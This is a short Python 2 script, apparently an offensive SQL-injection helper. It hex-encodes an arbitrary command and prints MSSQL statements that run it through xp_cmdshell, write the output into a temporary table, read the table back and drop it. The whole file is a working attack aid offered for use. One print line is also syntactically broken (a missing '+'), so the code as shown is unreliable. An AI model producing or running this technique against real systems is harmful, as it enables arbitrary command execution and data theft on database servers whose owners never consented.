######                                              ######
### The script takes two (2) variable inputs:          ###
### table_name && cmd_you_want_to_run                  ###
### EX: ./<script>.py table_name "cmd_you_want_to_run" ###
######                                              ######

import sys

table = sys.argv[1]
cmd_string = sys.argv[2]

list(cmd_string)

buf = "0x"
count = 0
while count < len(list(cmd_string)):
	buf += list(cmd_string)[count].encode("hex")
	buf += "00"
	count += 1

print ""
print "[+]  The command you want to run is:                       " + cmd_string
print "[+]  The HEX value for your command for xp_cmdshell is:    " + buf
print ""
print "[+]  Here are the commands you need to run (MSSQL):  "
print""
print "create table " + table + " (id int not null identity (1,1), output nvarchar(4096) null);-- "
print ""
print "declare @t nvarchar(4096) set @t=" + buf + " insert into " + table + " (output) EXEC master.dbo.xp_cmdshell @t; "
print ""
print "SELECT id from " + table "; "
print ""
print "SELECT * from " + table + " WHERE id=xx; "
print ""
print "DROP TABLE " + table + "; "
print ""
